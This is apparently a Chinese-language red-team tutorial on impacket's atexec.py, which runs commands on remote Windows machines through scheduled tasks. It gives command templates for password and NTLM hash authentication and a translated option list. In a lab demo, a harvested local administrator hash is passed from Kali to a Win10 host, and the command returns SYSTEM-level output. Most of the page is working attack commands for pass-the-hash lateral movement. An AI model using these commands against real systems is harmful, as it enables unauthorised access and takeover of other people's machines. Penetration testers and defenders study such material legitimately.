
# impacket-atexec
<div style="text-align: right;">

date: "2023-12-10"

</div>

## 工具特点

atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。

## 基础使用

域环境下传递密码

```shell
python3 atexec.py <domain>/<username>:<password>@<ip> "<command>"
```

本地环境下传递密码

```shell
python3 atexec.py ./<username>:<password>@<ip> "<command>"
```

域环境下传递Hash

```shell
python3 atexec.py -hashes :<hash> <domain>/<username>@<ip> "<command>"
```

本地环境下传递Hash

```shell
python3 atexec.py -hashes :<hash> ./<username>@<ip> "<command>"
```

## 参数说明

```shell
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

用法: atexec.py [-h] [-session-id SESSION_ID] [-ts] [-silentcommand] [-debug] [-codec CODEC]
                 [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                 [-keytab KEYTAB]
                 target [command [command ...]]

位置参数:
  target                目标 [[域/]用户名[:密码]@]<目标名称或地址>
  command               command 在目标处执行的命令

可选参数:
  -h, --help            显示此帮助消息并退出
  -session-id SESSION_ID
                        要使用的现有登录会话（无输出，无 cmd.exe）
  -ts                   为每个日志输出添加时间戳
  -silentcommand        不执行 cmd.exe 来运行给定命令（无输出）
  -debug                打开 DEBUG 输出
  -codec CODEC          设置目标输出中使用的编码（编解码器）（默认“utf-8”）。如果检测到错误，请在目标上运行 chcp.com，将结果映射到 https://docs.python.org/3/library/ codecs.html #standard-encodings 然后使用 -codec 和相应的编解码器再次执行 wmiexec.py

验证:
  -hashes LMHASH:NTHASH
                        NTLM 哈希值，格式为 LMHASH:NTHASH
  -no-pass              不询问密码（对于 -k 很有用）
  -k                    使用 Kerberos 身份验证。 根据目标参数从 ccache 文件 (KRB5CCNAME) 获取凭据。 如果找不到有效的凭据，它将使用命令行中指定的凭据
  -aesKey hex key       用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）
  -dc-ip ip address     域控制器的 IP 地址。 如果省略，它将使用目标参数中指定的域部分 (FQDN)
  -keytab KEYTAB        从 keytab 文件中读取 SPN 的密钥
```

## 实验环境

> 在其它机器上收集到Win10机器的Hash密码进行横向传递

| 机器  | IP             | 状态                       |
| ----- | -------------- | -------------------------- |
| Win10 | 192.168.36.130 | 知道本地管理员用户的Hash值 |
| Kali  | 192.168.36.128 |                            |

```shell
# python3 atexec.py -hashes :579da618cfbfa85247acf1f800a280a4 administrator@192.168.36.130 "whoami"
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \DhAKeVuu
[*] Running task \DhAKeVuu
[*] Deleting task \DhAKeVuu
[*] Attempting to read ADMIN$\Temp\DhAKeVuu.tmp
[*] Attempting to read ADMIN$\Temp\DhAKeVuu.tmp
nt authority\system
```

